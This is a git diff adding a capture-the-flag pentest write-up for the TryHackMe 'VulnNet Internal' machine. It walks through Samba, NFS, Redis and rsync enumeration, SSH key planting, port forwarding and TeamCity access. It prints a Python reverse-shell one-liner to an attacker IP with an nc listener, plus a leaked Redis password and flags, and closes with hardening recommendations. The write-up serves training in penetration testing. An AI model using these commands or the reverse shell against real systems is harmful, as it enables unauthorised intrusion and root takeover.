@@ -1,3 +1,5 @@
+[TOC]
+
 # Project 3 - Infrastructure pentesting
 ## Security Raport
 ### Subject
@@ -71,6 +73,15 @@ CVSS is broken down into 8 different metrics. In this section, we’ll explore e
 ## Table of content
 
 [TOCM]
+## Security Raport
+## Executive summay
+## Risk classification
+## CVSS - Common Vulnerability Scoring System
+## Table of content
+## Change history
+## Process of gathering flags
+### Summary
+
 
 [TOC]
 
@@ -102,4 +113,152 @@ First we had to scan the machite to find interesting open ports and services. At
 sudo nmap -sSCV -T4 -A --script=default,vuln -oA nmap_scan 10.10.77.37
 ```
 
+result of operation this command:
 
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/01.nmap_scan.jpg)
+
+Here we have several  ports, which are opened. Try to enumerate samba.
+
+2. Enumerating samba (ports: 139, 445)
+Using `enum4linux 10.10.77.37` we discovered share named `shared`:
+
+```
+Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        shares          Disk      VulnNet Business Shares
+        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
+```
+We can access it without authentication
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/02.smbclient.png)
+
+We downloaded all files with get command. Interesting file is service.txt, where first flag have been found.
+```
+cat services.txt -> THM{0a09d51e488f5fa105d8d866a497440a}
+```
+3. rpc enumeration (NFS)
+Port 111 pointing on rpc service. Let's try which directories are mounted
+
+```
+showmount -e 10.10.77.37 | tee rpc_enum
+```
+We have one directory to which w could mount:
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/03a.showmount.png)
+
+The next step is to make temporary folder and mount above-mentioned folder. As earlier, we had access without any authorization.
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/03b.mount.png)
+
+`df` command shows us that resource has been mounted. Command `tree` shows the structure of mounted directory. We searched for some interesting files containing 'pass' phrase.
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/04.redis_pass.png)
+
+So, we have found file: redis.conf and interesting entry: requirepass "B65Hx562F@ggAZ@F"
+
+Redis, which stands for Remote Dictionary Server, is a fast, open source, in-memory, key-value data store. 
+Redis is an open source (BSD licensed), in-memory data structure store used as a database, cache, message broker, and streaming engine. Redis provides data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps, hyperloglogs, geospatial indexes, and streams. Redis has built-in replication, Lua scripting, LRU eviction, transactions, and different levels of on-disk persistence, and provides high availability via Redis Sentinel and automatic partitioning with Redis Cluster.
+[Redis](https://redis.io/docs/about/)
+
+We used found data to log in redis database.
+
+4. Redis enumeration
+```
+redis-cli -h 10.10.79.9 -a 'B65Hx562F@ggAZ@F'
+```
+We can list the `KEYS`. The internal flag is found under the `internal flag` key. 
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/05.internal%20flag.png)
+
+Still connected to the Redis server, we find a base64 encoded string under the `authlist` object.
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/06.rsync_auth_pass.png)
+
+In encoded string we get clear information about next step. We use rsync to perform further scheme.
+
+5. rsync enumeration
+Connecting to the rsync server reveals a `files` directory.
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/07.rsync_connect.png)
+
+In directory structure there is a `sys-internal` folder, which contains the user flag
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/08.user.txt%20flag.png)
+
+6. SSH connection
+With help of `rsync` we have access to whole dir structure of user `sys-internal` including ~/.ssh. We generate ssh pair keys and synchronize on victims machine.
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/09.ssh_key_generate.png)
+
+No need to know `sys-internal's` password, connect to server using ssh keys.
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/10.get_shell_sys-internal.png)
+
+There is a TeamCity installed.
+TeamCity is a Continuous Integration and Deployment server that provides out-of-the-box continuous unit testing, code quality analysis, and early reporting on build problems. A simple installation process lets you deploy TeamCity and start improving your release management practices in a matter of minutes. TeamCity supports Java, .NET, and Ruby development and integrates perfectly with major IDEs, version control systems, and issue tracking systems.
+[TeamCity](https://www.jetbrains.com/teamcity/)
+
+By default, the TeamCity server is accessible under the root context of the server address (for example, `http://localhost:8111/`)
+[TeamCity configuration](https://www.jetbrains.com/help/teamcity/configure-server-installation.html)
+
+Check whether it has default port configuration
+```
+ss -tulwn 
+```
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/11.ss_-tulwn_check.png)
+
+```
+wget localhost:8111
+```
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/12.wget_TeamCity_try.png)
+
+Server is accessible only from victim's host. We provided port forwarding to get access to this server from attacker computer.
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/13.port_forwarding.png)
+
+Server is open from attacer machine on forwarded port 8080.
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/14.curl_localhost.png)
+
+7. TeamCity
+Now when we connect to http://localhost:8111, we can see the TeamCity login page:
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/15.local_login_page.png)
+
+We can log to TeamCity as `Super user`. Credentials to log as `Super user` found in log files.
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/16.dir_logs_found.png)
+
+cat log files:
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/17.pass_in_logs_files.png)
+
+8. Inject python script
+During exploratin site we were able to insert python script to create reverse shell with root privileges. This gave us possibilty to reveal the last `root.txt` flag.
+Steps to run script:
+- create new project:
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/101_create_new_proj.png)
+- name it
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/102_manually.png)
+- create build configuration
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/103_build_con.png)
+- jump to build steps
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/104_build_steps.png)
+- add build steps
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/105_add_build_step.png)
+- choose python
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/106_choose_python.png)
+- select custom script and enter reverse shell
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/107_custom_script.png)
+```
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.6.24",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+```
+[Reverse Shell Generator](https://www.revshells.com/)
+- create listener on attacker's machine:
+```
+nc -nlvp 7777
+```
+- run script on victim's page
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/108_run.png)
+- got shell with root privileges. 
+![](https://github.com/farixus/projekt3/blob/main/screenshots%20VulnNet%20Internal/110_foot_flag.png)
+
+Root flag: THM{e8996faea46df09dba5676dd271c60bd}
+
+### Recommendation
+It is recommended to:
+* protect share `shares` with password not to allow attacker reveal files
+* set right file permissions of `redis.conf` for example: 600
+* clear log periodicly, first of all teamcity's logs
+* not allow to run scripts on teamcity's page
+
+More information
+* [smb configuration](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html)
+* [redis configuration](https://redis.io/docs/management/config/)
+* [TeamCity configuration](https://www.jetbrains.com/help/teamcity/teamcity-documentation.html)
